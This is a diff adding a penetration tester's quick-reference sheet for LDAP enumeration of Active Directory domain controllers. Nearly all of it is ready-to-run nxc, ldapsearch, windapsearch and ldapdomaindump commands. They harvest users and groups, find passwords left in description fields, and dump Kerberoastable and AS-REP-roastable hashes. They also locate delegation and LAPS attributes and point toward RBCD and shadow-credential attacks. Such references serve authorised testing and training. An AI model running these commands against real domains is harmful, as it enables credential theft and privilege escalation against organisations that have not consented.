@@ -1,0 +1,31 @@
+LDAP ENUMERATION — QUICK REF
+
+Requires: reachable DC LDAP (389/636); null-bind or any valid domain account
+
+1.  Base DN (anon):
+    ldapsearch -x -H ldap://<dc-ip> -s base namingcontexts
+    # domain.local -> DC=domain,DC=local
+
+2.  nxc fast wins:
+    nxc ldap <dc-ip> -u <user> -p <pass> --users
+    nxc ldap <dc-ip> -u <user> -p <pass> --groups
+    nxc ldap <dc-ip> -u <user> -p <pass> -M user-desc          # passwords in descriptions
+    nxc ldap <dc-ip> -u <user> -p <pass> --kerberoasting out.txt
+    nxc ldap <dc-ip> -u <user> -p <pass> --asreproast out.txt
+    nxc ldap <dc-ip> -u <user> -p <pass> --password-not-required
+    nxc ldap <dc-ip> -u <user> -p '' --find-delegation
+
+3.  ldapsearch (LDAP="-x -H ldap://<dc-ip> -D '<user>@<domain>' -w '<pass>' -b 'DC=domain,DC=local'"):
+    ldapsearch $LDAP "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
+    ldapsearch $LDAP "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName   # AS-REP
+    ldapsearch $LDAP "(userAccountControl:1.2.840.113556.1.4.803:=524288)" sAMAccountName    # unconstrained deleg
+    ldapsearch $LDAP "(&(objectClass=group)(cn=Domain Admins))" member
+
+4.  Bulk:
+    windapsearch -d <domain> --dc-ip <dc-ip> -u <user>@<domain> -p <pass> -U
+    windapsearch ... --da   |   ... -PU
+    ldapdomaindump -u '<domain>\<user>' -p '<pass>' <dc-ip>
+
+5.  Attrs to grep: description info servicePrincipalName userAccountControl memberOf
+    msDS-AllowedToDelegateTo ms-MCS-AdmPwd(LAPS) adminCount
+    # write attrs (RBCD/shadow-creds) -> use ldaps://<dc-ip>
